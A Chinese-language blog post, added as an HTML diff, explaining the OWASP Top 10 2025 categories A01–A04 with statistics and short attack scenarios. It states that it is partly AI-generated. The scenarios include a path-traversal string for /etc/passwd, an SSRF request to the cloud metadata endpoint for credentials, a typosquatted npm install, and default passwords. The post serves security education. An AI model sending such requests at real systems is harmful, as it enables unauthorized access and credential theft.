@@ -1,0 +1,1403 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/I.png">
+  <link rel="icon" href="/img/I.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Infernity">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="注意：本文内容部分由AI生成，请读者注意甄别。  前言OWASP（Open Web Application Security Project，开放式 Web 应用程序安全项目）是一个非营利组织，致力于提升软件安全性。其旗舰项目 OWASP Top 10 是 Web 应用安全领域最权威的风险评估标准，自 2003 年首次发布以来，已成为全球安全从业人员、开发者和审计人员的必备参考。 2025 年">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OWASP TOP 10 2025 详细解析">
+<meta property="og:url" content="http://example.com/2026/07/08/OWASP-TOP-10-2025/index.html">
+<meta property="og:site_name" content="Infernity&#39;s Blog">
+<meta property="og:description" content="注意：本文内容部分由AI生成，请读者注意甄别。  前言OWASP（Open Web Application Security Project，开放式 Web 应用程序安全项目）是一个非营利组织，致力于提升软件安全性。其旗舰项目 OWASP Top 10 是 Web 应用安全领域最权威的风险评估标准，自 2003 年首次发布以来，已成为全球安全从业人员、开发者和审计人员的必备参考。 2025 年">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/OWASP-TOP-10-2025/TOP_10_logo_Final_Logo_Colour.png">
+<meta property="article:published_time" content="2026-07-08T03:15:38.000Z">
+<meta property="article:modified_time" content="2026-07-08T03:12:09.880Z">
+<meta property="article:author" content="Infernity">
+<meta property="article:tag" content="WEB安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/OWASP-TOP-10-2025/TOP_10_logo_Final_Logo_Colour.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>OWASP TOP 10 2025 详细解析 - Infernity&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":150,"cursorChar":"_","loop":true,"scope":["home"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Infernity&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/friends/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>friends</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/background/19.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">OWASP TOP 10 2025 详细解析</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-07-08 11:15" pubdate>
+          2026年7月8日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          47 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">OWASP TOP 10 2025 详细解析</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>注意：本文内容部分由AI生成，请读者注意甄别。</p>
+</blockquote>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>OWASP（Open Web Application Security Project，开放式 Web 应用程序安全项目）是一个非营利组织，致力于提升软件安全性。其旗舰项目 OWASP Top 10 是 Web 应用安全领域最权威的风险评估标准，自 2003 年首次发布以来，已成为全球安全从业人员、开发者和审计人员的必备参考。</p>
+<p>2025 年 11 月，OWASP 在 Global AppSec DC 大会上发布了 <strong>OWASP Top 10:2025 Release Candidate</strong> 版本，这是继 2021 版之后时隔四年的大版本更新。本轮收录了来自 <strong>超过 280 万个应用程序</strong> 的测试数据，涉及 <strong>589 个 CWE</strong>（2021 年仅约 400 个），是迄今为止数据规模最大的一版。</p>
+<hr>
+<h2 id="2021-版-vs-2025-版变化一览"><a href="#2021-版-vs-2025-版变化一览" class="headerlink" title="2021 版 vs 2025 版变化一览"></a>2021 版 vs 2025 版变化一览</h2><p><img src="/img/OWASP-TOP-10-2025/2025-mappings.png" srcset="/img/loading.gif" lazyload alt="2025-mappings"></p>
+<p>一眼看过去，最大的变化有三处：</p>
+<ol>
+<li><strong>A02 安全配置错误</strong> 从 #5 跃升至 #2，成为上升幅度最大的类别</li>
+<li><strong>A03 软件供应链安全</strong> 正式独立成类，从 2021 版的 #6 “脆弱和过时的组件” 扩展为涵盖整个软件供应链</li>
+<li><strong>A10 异常条件处理不当</strong> 作为全新类别入榜</li>
+</ol>
+<p>而原先 2021 版的 <strong>A10:2021 SSRF</strong> 类别被整合到了 A01 访问控制中，不再单独列出。</p>
+<table>
+<thead>
+<tr>
+<th>排名</th>
+<th>2025 类别</th>
+<th>2021 排名</th>
+<th>变化趋势</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>A01</strong></td>
+<td>访问控制失效 (Broken Access Control)</td>
+<td>#1</td>
+<td>↔ 持平（SSRF 并入此类别）</td>
+</tr>
+<tr>
+<td><strong>A02</strong></td>
+<td>安全配置错误 (Security Misconfiguration)</td>
+<td>#5</td>
+<td><strong>↑3</strong> 最大上升</td>
+</tr>
+<tr>
+<td><strong>A03</strong></td>
+<td>软件供应链失效 (Software Supply Chain Failures)</td>
+<td>#6 (原”脆弱和过时的组件”)</td>
+<td><strong>↑3</strong> 大幅扩展</td>
+</tr>
+<tr>
+<td><strong>A04</strong></td>
+<td>加密机制失效 (Cryptographic Failures)</td>
+<td>#2</td>
+<td>↓2</td>
+</tr>
+<tr>
+<td><strong>A05</strong></td>
+<td>注入 (Injection)</td>
+<td>#3</td>
+<td>↓2</td>
+</tr>
+<tr>
+<td><strong>A06</strong></td>
+<td>不安全设计 (Insecure Design)</td>
+<td>#4</td>
+<td>↓2</td>
+</tr>
+<tr>
+<td><strong>A07</strong></td>
+<td>身份认证失效 (Authentication Failures)</td>
+<td>#7</td>
+<td>↔ 持平（名称缩短）</td>
+</tr>
+<tr>
+<td><strong>A08</strong></td>
+<td>软件和数据完整性失效 (Software &amp; Data Integrity Failures)</td>
+<td>#8</td>
+<td>↔ 持平</td>
+</tr>
+<tr>
+<td><strong>A09</strong></td>
+<td>日志和告警失效 (Logging &amp; Alerting Failures)</td>
+<td>#9</td>
+<td>↔ 持平（名称变更）</td>
+</tr>
+<tr>
+<td><strong>A10</strong></td>
+<td>异常条件处理不当 (Mishandling of Exceptional Conditions)</td>
+<td>🆕</td>
+<td><strong>新上榜</strong></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="方法论简述"><a href="#方法论简述" class="headerlink" title="方法论简述"></a>方法论简述</h2><p>OWASP Top 10 2025 延续了”数据驱动但不盲从数据”的选型哲学：</p>
+<ul>
+<li><strong>数据来源</strong>：从 2020 年到 2024 年，覆盖超过 280 万个应用程序的测试结果，数据贡献方包括各大安全厂商。</li>
+<li><strong>排名策略</strong>：8 个类别根据数据贡献排名，2 个类别（A03 和 A09）由社区调查投票提升&#x2F;突出。</li>
+<li><strong>CVSS 权重</strong>：结合 CVSS v2 和 v3 的 Exploit 和 Impact 评分对 CWE 进行加权。</li>
+<li><strong>根本原因优先</strong>：继续向”根本原因”分类倾斜，而非”症状”分类。例如，”敏感数据暴露”这个症状被拆解到加密、配置、访问控制等根本原因类别中。</li>
+</ul>
+<blockquote>
+<p>为什么不全用数据？因为自动化工具能测到的东西永远落后于实战。实战中 AppSec 专家发现的新型攻击模式，往往要过几年才能被工具集成，而社区调查就是为了弥补这个盲区。</p>
+</blockquote>
+<hr>
+<h2 id="A01-2025-—-访问控制失效-Broken-Access-Control"><a href="#A01-2025-—-访问控制失效-Broken-Access-Control" class="headerlink" title="A01:2025 — 访问控制失效 (Broken Access Control)"></a>A01:2025 — 访问控制失效 (Broken Access Control)</h2><p><img src="/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Broken_Access_Control.png" srcset="/img/loading.gif" lazyload alt="A01 icon"></p>
+<h3 id="背景与数据"><a href="#背景与数据" class="headerlink" title="背景与数据"></a>背景与数据</h3><p>连续第二届蝉联榜首。<strong>100% 的受测应用存在某种形式的访问控制问题</strong>，平均发生率为 **3.74%**。此类别映射了 40 个 CWE，总发生次数超过 <strong>183 万次</strong>，关联 CVE 达到 <strong>32,654 个</strong>。</p>
+<table>
+<thead>
+<tr>
+<th>指标</th>
+<th>数据</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>映射 CWE</td>
+<td>40 个（触达上限）</td>
+</tr>
+<tr>
+<td>最大发生率</td>
+<td>20.15%</td>
+</tr>
+<tr>
+<td>平均发生率</td>
+<td>3.74%</td>
+</tr>
+<tr>
+<td>最大覆盖率</td>
+<td>100.00%</td>
+</tr>
+<tr>
+<td>平均加权 Exploit 评分</td>
+<td>7.04</td>
+</tr>
+<tr>
+<td>平均加权 Impact 评分</td>
+<td>3.84</td>
+</tr>
+<tr>
+<td>总发生次数</td>
+<td>1,839,701</td>
+</tr>
+<tr>
+<td>关联 CVE</td>
+<td>32,654</td>
+</tr>
+</tbody></table>
+<h3 id="主要包含什么"><a href="#主要包含什么" class="headerlink" title="主要包含什么"></a>主要包含什么</h3><p>访问控制是指确保用户只能在其预定权限范围内操作的安全机制。失效典型表现为：</p>
+<ul>
+<li><strong>越权访问</strong>：用户可访问他人的账户数据（CWE-639 水平越权 &#x2F; CWE-862 功能级越权）</li>
+<li><strong>路径遍历</strong>（CWE-22）：通过 <code>../../../etc/passwd</code> 读取任意文件</li>
+<li><strong>SSRF</strong>（CWE-918）：诱导服务端向内部网络发起请求（<strong>2025 版新纳入此类别</strong>）</li>
+<li><strong>CSRF</strong>（CWE-352）：跨站请求伪造</li>
+<li><strong>Open Redirect</strong>（CWE-601）：开放重定向</li>
+<li><strong>信息暴露</strong>（CWE-200）：敏感信息泄露给未授权主体</li>
+<li><strong>直接请求&#x2F;强制浏览</strong>（CWE-425）：绕过前端控制直接访问后端接口</li>
+</ul>
+<h3 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h3><p><strong>场景 1：水平越权</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/app/accountInfo?acct=notmyacct</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>example.com<br></code></pre></td></tr></table></figure>
+
+<p>攻击者修改浏览器中的 <code>acct</code> 参数，无需任何验证即可访问任意用户的账户信息。</p>
+<p><strong>场景 2：垂直越权</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 非管理员用户直接访问管理接口</span><br>curl https://example.com/app/admin_getappInfo<br></code></pre></td></tr></table></figure>
+
+<p>应用仅在前端 JavaScript 中做了权限控制，但后端未验证。攻击者直接从命令行访问即可绕过。</p>
+<p><strong>场景 3：SSRF 打内网</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/fetch</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>example.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://169.254.169.254/latest/meta-data/&quot;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>应用未对用户传入的 URL 做白名单限制，攻击者可请求云实例元数据接口窃取临时凭证。</p>
+<hr>
+<h2 id="A02-2025-—-安全配置错误-Security-Misconfiguration"><a href="#A02-2025-—-安全配置错误-Security-Misconfiguration" class="headerlink" title="A02:2025 — 安全配置错误 (Security Misconfiguration)"></a>A02:2025 — 安全配置错误 (Security Misconfiguration)</h2><p><img src="/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Security_Misconfiguration.png" srcset="/img/loading.gif" lazyload alt="A02 icon"></p>
+<h3 id="背景与数据-1"><a href="#背景与数据-1" class="headerlink" title="背景与数据"></a>背景与数据</h3><p>从上一届的 #5 飙升至 #2，是上升幅度最大的类别。<strong>100% 的受测应用存在某种形式的配置错误</strong>，平均发生率为 **3.00%**，总发生次数超过 <strong>71.9 万次</strong>。随着软件可配置化程度越来越高，这个类别只会更严重。</p>
+<table>
+<thead>
+<tr>
+<th>指标</th>
+<th>数据</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>映射 CWE</td>
+<td>16 个</td>
+</tr>
+<tr>
+<td>最大发生率</td>
+<td>27.70%</td>
+</tr>
+<tr>
+<td>平均发生率</td>
+<td>3.00%</td>
+</tr>
+<tr>
+<td>最大覆盖率</td>
+<td>100.00%</td>
+</tr>
+<tr>
+<td>平均加权 Exploit 评分</td>
+<td>7.96</td>
+</tr>
+<tr>
+<td>平均加权 Impact 评分</td>
+<td>3.97</td>
+</tr>
+<tr>
+<td>总发生次数</td>
+<td>719,084</td>
+</tr>
+<tr>
+<td>关联 CVE</td>
+<td>1,375</td>
+</tr>
+</tbody></table>
+<h3 id="主要包含什么-1"><a href="#主要包含什么-1" class="headerlink" title="主要包含什么"></a>主要包含什么</h3><ul>
+<li><strong>默认账户和密码</strong>：admin&#x2F;admin、root&#x2F;toor 等未修改的默认凭据</li>
+<li><strong>开放的云存储</strong>：S3 bucket 或 Azure Blob 未设权限就开放公网访问</li>
+<li><strong>冗余功能</strong>：生产环境启用了调试模式、Swagger UI 等不该暴露的接口</li>
+<li><strong>安全头缺失</strong>：缺少 CSP、X-Frame-Options、HSTS 等安全头</li>
+<li><strong>详细错误信息</strong>：堆栈跟踪、数据库版本、内部架构信息直接返回给用户</li>
+<li><strong>XXE</strong>（CWE-611）：XML 外部实体注入也归入了此类别</li>
+</ul>
+<h3 id="攻击场景-1"><a href="#攻击场景-1" class="headerlink" title="攻击场景"></a>攻击场景</h3><p><strong>场景 1：默认凭据</strong></p>
+<p>应用服务器自带的管理控制台未移除，且默认账号密码未修改。攻击者直接用 <code>admin/admin</code> 登录并接管服务器。</p>
+<p><strong>场景 2：目录列表暴露</strong></p>
+<p>服务器未禁用目录列表功能，攻击者列出目录后下载编译的 Java 类文件，反编译后发现了严重的访问控制漏洞。</p>
+<p><strong>场景 3：详细错误信息泄露</strong></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json">HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">500</span> Internal Server Error<br><br><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;SQLException&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Table &#x27;users&#x27; not found in database &#x27;prod_db&#x27;&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;stacktrace&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;at com.example.dao.UserDAO.findUser(UserDAO.java:42)</span><br><span class="hljs-string">                 at com.example.controller.LoginController.login(LoginController.java:28)</span><br><span class="hljs-string">                 ...&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;db_version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;MySQL 8.0.35&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>堆栈跟踪直接暴露了数据库名称、版本和代码路径结构。</p>
+<hr>
+<h2 id="A03-2025-—-软件供应链失效-Software-Supply-Chain-Failures"><a href="#A03-2025-—-软件供应链失效-Software-Supply-Chain-Failures" class="headerlink" title="A03:2025 — 软件供应链失效 (Software Supply Chain Failures)"></a>A03:2025 — 软件供应链失效 (Software Supply Chain Failures)</h2><p><img src="/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Software_Supply_Chain_Failures.png" srcset="/img/loading.gif" lazyload alt="A03 icon"></p>
+<h3 id="背景与数据-2"><a href="#背景与数据-2" class="headerlink" title="背景与数据"></a>背景与数据</h3><p>2025 版最受瞩目的新类别。虽然仅映射了 <strong>5 个 CWE</strong>（数量最少），但最大发生率高得惊人——**27.92%**，平均发生率为 <strong>5.19%<strong>。在社区调查中，</strong>超过半数受访者将其列为 #1</strong> 关注重点。</p>
+<blockquote>
+<p>这个类别从 2021 版的 A06 “Vulnerable and Outdated Components” 大幅扩展而来，现在的范围涵盖了整个软件供应链。</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>指标</th>
+<th>数据</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>映射 CWE</td>
+<td>5 个</td>
+</tr>
+<tr>
+<td>最大发生率</td>
+<td>27.92%</td>
+</tr>
+<tr>
+<td>平均发生率</td>
+<td>5.19%</td>
+</tr>
+<tr>
+<td>平均加权 Exploit 评分</td>
+<td>8.51（最高）</td>
+</tr>
+<tr>
+<td>平均加权 Impact 评分</td>
+<td>4.35（最高）</td>
+</tr>
+<tr>
+<td>总发生次数</td>
+<td>127,270</td>
+</tr>
+<tr>
+<td>关联 CVE</td>
+<td>11</td>
+</tr>
+</tbody></table>
+<h3 id="主要包含什么-2"><a href="#主要包含什么-2" class="headerlink" title="主要包含什么"></a>主要包含什么</h3><ul>
+<li><strong>第三方依赖漏洞</strong>：使用了存在已知漏洞的组件版本</li>
+<li><strong>恶意软件包</strong>：依赖于被投毒的开源包（typo-squatting、包仓库攻击）</li>
+<li><strong>构建系统被入侵</strong>：CI&#x2F;CD 流水线被篡改，镜像被替换</li>
+<li><strong>分发基础设施被攻破</strong>：如 SolarWinds 事件中的更新服务器被控制</li>
+</ul>
+<blockquote>
+<p>SolarWinds、Log4Shell (Log4j)、MoveIT —— 这些灾难性事件的共同点：一旦供应链被污染，攻击的爆炸半径极为可怕。</p>
+</blockquote>
+<h3 id="攻击场景-2"><a href="#攻击场景-2" class="headerlink" title="攻击场景"></a>攻击场景</h3><p><strong>场景 1：Log4Shell 式依赖漏洞</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- pom.xml 中引用了存在漏洞的 log4j 版本 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <span class="hljs-comment">&lt;!-- CVE-2021-44228 --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>场景 2：恶意 npm 包</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 攻击者发布了一个名称类似于流行包的恶意 npm 包</span><br>npm install lod-ash  <span class="hljs-comment"># 注意：这不是 lodash！</span><br></code></pre></td></tr></table></figure>
+
+<p>恶意包在 <code>postinstall</code> 脚本中收集环境变量和环境信息并外发到攻击者服务器。</p>
+<hr>
+<h2 id="A04-2025-—-加密机制失效-Cryptographic-Failures"><a href="#A04-2025-—-加密机制失效-Cryptographic-Failures" class="headerlink" title="A04:2025 — 加密机制失效 (Cryptographic Failures)"></a>A04:2025 — 加密机制失效 (Cryptographic Failures)</h2><p><img src="/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Cryptographic_Failures.png" srcset="/img/loading.gif" lazyload alt="A04 icon"></p>
+<h3 id="背景与数据-3"><a href="#背景与数据-3" class="headerlink" title="背景与数据"></a>背景与数据</h3><p>从 #2 下降至 #4，一定程度上反映了行业在加密基线方面的进步（如 TLS 1.2+、HSTS 的广泛采用）。但此类别仍然映射了 <strong>32 个 CWE</strong>，关联了超过 <strong>35,000 个 CVE</strong>。</p>
+<table>
+<thead>
+<tr>
+<th>指标</th>
+<th>数据</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>映射 CWE</td>
+<td>32 个</td>
+</tr>
+<tr>
+<td>最大发生率</td>
+<td>32.35%</td>
+</tr>
+<tr>
+<td>平均发生率</td>
+<td>3.80%</td>
+</tr>
+<tr>
+<td>平均加权 Exploit 评分</td>
+<td>5.94</td>
+</tr>
+<tr>
+<td>平均加权 Impact 评分</td>
+<td>4.81</td>
+</tr>
+<tr>
+<td>总发生次数</td>
+<td>68,988</td>
+</tr>
+<tr>
+<td>关联 CVE</td>
+<td>35,420（最多）</td>
+</tr>
+</tbody></table>
+<h3 id="主要包含什么-3"><a href="#主要包含什么-3" class="headerlink" title="主要包含什么"></a>主要包含什么</h3><ul>
+<li><strong>明文传输</strong>：敏感数据使用 HTTP 而非 HTTPS 传输</li>
+<li><strong>弱加密算法</strong>：MD5、SHA1、RC4 等已被证明不安全的算法</li>
+<li><strong>密钥管理不当</strong>：硬编码密钥、密钥泄露到代码仓库</li>
+<li><strong>敏感数据明文存储</strong>：密码、信用卡号以明文存入数据库</li>
+<li><strong>弱 TLS 配置</strong>：接受过时协议版本和弱密码套件</li>
+</ul>
+<h3 id="攻击场景-3"><a href="#攻击场景-3" class="headerlink" title="攻击场景"></a>攻击场景</h3><p><strong>场景 1：密码明文存储</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 数据库中直接存了明文密码</span><br><span class="hljs-keyword">SELECT</span> username, password <span class="hljs-keyword">FROM</span> users;<br><span class="hljs-comment">-- username  | password</span><br><span class="hljs-comment">-- admin     | P@ssw0rd123!</span><br><span class="hljs-comment">-- user1     | qwerty123</span><br></code></pre></td></tr></table></figure>
+
+<p>一旦数据库泄露（如 SQL 注入），所有用户的密码直接暴露。</p>
+<p><strong>场景 2：硬编码密钥</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># config.py - 直接上传到了 GitHub</span><br>AWS_ACCESS_KEY = <span class="hljs-string">&quot;AKIAIOSFODNN7EXAMPLE&quot;</span><br>AWS_SECRET_KEY = <span class="hljs-string">&quot;wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY&quot;</span><br>ENCRYPTION_KEY = <span class="hljs-string">&quot;my-super-secret-key-1234&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>代码仓库扫描工具发现后，攻击者可直接接管云资源。</p>
+<hr>
